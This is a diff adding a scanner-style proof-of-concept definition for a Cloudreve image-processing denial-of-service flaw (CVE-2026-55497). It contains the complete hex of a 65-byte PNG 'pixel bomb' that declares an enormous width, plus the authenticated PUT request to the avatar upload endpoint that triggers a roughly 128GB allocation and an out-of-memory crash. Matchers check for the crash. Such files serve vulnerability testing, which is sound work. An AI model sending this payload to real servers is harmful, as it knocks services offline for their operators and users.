@@ -1,0 +1,49 @@
+[info]
+author = "ave"
+description = "Cloudreve 内置图片处理器仅检查压缩文件大小（最大75MB），未限制解码后像素尺寸。攻击者可上传一个仅65字节的恶意PNG图片（IHDR中声明宽2147483647×高16），触发Go运行时分配约128GB像素缓冲区，导致内核OOM Killer终止进程，造成服务完全不可用。通过头像上传接口（PUT /api/v4/user/setting/avatar）单次请求即可触发，需已认证用户权限。"
+id = "POC-AVE-2026-0615"
+name = "Cloudreve 图片像素炸弹拒绝服务漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-55497",
+    "cloudreve",
+    "dos",
+    "pixel-bomb",
+    "denial-of-service",
+]
+vuln_id = [
+    "CVE-2026-55497",
+    "AVE-2026-0615",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/api/v4/user/setting/avatar"
+protocol = "http"
+
+[poc.requests.body]
+content = "89504e470d0a1a0a0000000d494844527fffffff00000010080600000068bce2e30000000849444154789c030000000001480689d20000000049454e44ae426082"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "image/png"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "Out of memory",
+    "Killed process",
+    "connection refused",
+    "fatal error",
+]
+
+[[poc.requests.matchers]]
+expect = false
+status = [0]
+type = "status"
